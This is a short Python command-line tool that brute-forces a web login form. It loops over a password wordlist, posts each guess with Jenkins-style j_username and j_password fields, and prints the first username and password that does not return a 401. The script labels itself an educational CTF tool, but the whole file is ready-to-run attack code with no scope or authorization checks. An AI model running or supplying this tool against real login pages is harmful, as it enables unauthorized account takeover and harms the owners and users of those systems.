import requests
import argparse
from colorama import Fore, Style

def brute_force(url, username, wordlist_path):
    session = requests.Session()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
    }

    with open(wordlist_path, "r", encoding="latin-1") as f:
        wordlist = f.read().splitlines()

    attempts = 0
    for password in wordlist:
        attempts += 1
        data = {
            "j_username": username,
            "j_password": password,
            "from": "/",
            "Submit": "Sign in"
        }

        response = session.post(url, data=data, headers=headers)

        if response.status_code == 401:
            print(f"{Fore.RED}[-] Fail : {password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Valid → {username}:{password}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Tried {attempts} passwords before success!{Style.RESET_ALL}")
            break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Brute Force Tool (Educational)")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g. http://localhost:8080/j_acegi_security_check)")
    parser.add_argument("-u", "--username", required=True, help="Username to brute force")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")

    args = parser.parse_args()

    brute_force(args.target, args.username, args.wordlist)